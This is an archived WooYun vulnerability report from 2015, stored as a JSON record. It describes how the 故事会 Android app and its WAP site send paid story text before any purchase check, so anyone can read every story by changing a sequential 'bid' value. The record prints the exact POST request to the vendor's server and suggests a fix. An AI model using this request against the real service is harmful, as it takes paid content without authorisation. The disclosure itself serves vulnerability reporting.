{"id": 32165, "wybug_id": "wooyun-2015-0112098", "wybug_title": "故事会安卓APP收费内容可绕过阅读", "wybug_corp": "故事会", "wybug_author": "路人甲", "wybug_date": "2015-05-20 18:03", "wybug_open_date": "2015-07-04 18:04", "wybug_type": "未授权访问/权限绕过", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可免费阅读所有故事会VIP内容 详细说明：  使用burpsuite对故事会安卓app抓包分析发现可绕过购买流程而直接阅读本应该要购买之后才能阅读的内容。首先随便打开一个故事，如图所示只显示了一部分，提示你没有权限阅读该内容，请购买该故事。\n\n打开burpsuite抓到的包显示为\n\n返回的是[{'isBuy':'false'}]，没有购买，所以会提示要求购买。但是在这个请求之后还有另外一个请求\n\n在返回的内容当中可以看到bmemo和content，意味着就算没有购买其实客户端也已经把需要购买之后才能显示的内容已经请求回来了，只是没有在客户端显示而已，所以想看那个故事只需要修改下面这个请求的bid即可阅读全部的故事内容\nPOST /admin/MutualServlet1_4 HTTP/1.1Content-Type: application/x-www-form-urlencodedUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.4; HUAWEI C8817E Build/HuaweiC8817E)Host: wap.storychina.cnConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 31dotype=GETSTORYCONTENT&bid=8065\nwap版本也可以通过此种方法绕过\n\n\n\n再加上其故事id是有序id，要想获得全部故事简直不要太容易   漏洞证明：  \nPOST /admin/MutualServlet1_4 HTTP/1.1Content-Type: application/x-www-form-urlencodedUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.4; HUAWEI C8817E Build/HuaweiC8817E)Host: wap.storychina.cnConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 31dotype=GETSTORYCONTENT&bid=8065\n   修复方案：  在加载故事的时候不取content，只取简介。待付费完成后或者用户权限校验过之后再用另一个请求取content再加载即可   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}